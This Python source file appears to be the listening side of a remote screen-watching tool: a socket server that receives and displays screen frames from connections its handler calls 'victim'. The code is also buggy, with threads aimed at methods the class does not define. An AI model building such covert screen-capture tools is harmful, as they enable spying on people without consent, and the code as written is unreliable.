import socket
import threading

from modules.protocol import Protocol
from screen_mirroring.screen_capture import ScreenShare


class Server(Protocol):

    def __init__(self, server, port):
        Protocol.__init__(self, server, port)
        self.screen_share = ScreenShare((1920, 1080), 'RGBA')
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(self.ADDR)
        thread = threading.Thread(target=self.screen_share.screen_display)
        thread.start()


    def handel_victim(self, conn):
        while True:
            data = self._recv_packet(conn)
            frame = self.screen_share.image_frombytes(data)
            self.screen_share.update_screen(frame)

    def start(self):
        self.server.listen()
        print(f'LISTENING... ({self.SERVER}:{self.PORT})')
        try:
            while True:
                conn, addr = self.server.accept()
                thread = threading.Thread(target=self.update, args=(conn,))
                thread2 = threading.Thread(target=self.screen_display)
                thread.start()
                thread2.start()
        except Exception as e:
            print(e)
            self.server.close()


if __name__ == '__main__':
    print('SERVER IS STARTING :)')
    Server('localhost', 8832).start()
